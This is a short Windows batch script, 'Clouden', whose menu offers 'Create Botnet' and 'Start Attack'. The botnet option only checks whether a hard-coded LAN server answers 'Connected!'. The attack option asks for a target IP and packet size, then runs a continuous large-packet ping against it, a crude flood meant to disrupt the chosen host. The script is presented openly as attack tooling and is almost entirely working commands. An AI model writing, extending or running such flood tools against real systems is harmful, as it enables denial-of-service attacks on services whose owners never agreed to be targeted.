@echo off
chcp 65001
cls
title Clouden ☁
set "HOST_URL=192.168.1.108"
color f
echo Make sure to regularly check for updates
ping localhost -n 2 >nul
title clouden ☁
:m
cls
Echo Option 1 Create Botnet
Echo Option 2 Start Attack
SET /P n= " [CHOICE] > "
if %n%==1 goto a
if %n%==2 goto b
:a
cls
set "success="
color e
ECHO Trying to connect to endpoints...
ping localhost -n 2 >nul
for /F "delims=" %%a in ('curl -s --connect-timeout 5 %HOST_URL%/') do (
    if "%%~a" equ "Connected!" set "success=[Online]"
)
if not defined success (
color c
echo Did not recieve correct response...
set "success=[Offline]" 
)
:v
color f 
Echo  Active Connections
Echo.
Echo                Servers          Status
Echo               %HOST_URL%      %success%
pause
cls 
goto m
:b
SET /P x= " Server IP > "
goto s
:s
set /p p= " Packet Size > "
ping %x% -t -l %p% 